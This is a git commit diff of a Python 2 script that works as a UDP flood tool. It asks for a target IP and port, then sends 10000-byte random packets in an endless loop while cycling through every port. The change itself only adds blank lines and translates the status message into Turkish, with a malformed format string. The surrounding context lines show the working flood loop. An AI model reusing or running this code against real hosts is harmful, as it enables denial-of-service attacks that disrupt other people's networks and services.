b3735af4d4d647d6cb276d945af20e377cb137e5
BroMasters <36071011+BroMasters@users.noreply.github.com>
2019-08-22 17:56:22 +0300

    Update index.py

--- index.py
+++ index.py
@@ -14,6 +14,7 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM);
 bytes = random._urandom(10000);
 timeout = time.time();
 os.system ("clear");
+
 print ("""
 \033[1;36;40m
  ______   _______  _______  _______  _______  _______ 
@@ -26,6 +27,7 @@ print ("""
 """)
 ip = raw_input("\033[1;33;40mIP: ");
 port = input("\033[1;33;40mPort: ");
+
 os.system("clear");
 sent = 0;
 while True:
@@ -37,6 +39,6 @@ while True:
          sock.sendto(bytes, (ip, port));
          sent = sent + 1;
          port = port + 1;
-         print "\033[92mSent %s packet to %s throught port:%s successful"%(sent,ip,port);
+         print "\033[0;32;47m%sent. paket, %ip adresine; %port portuyla gonderildi" %(sent,ip,port);
          if port == 65534:
            port = 1;
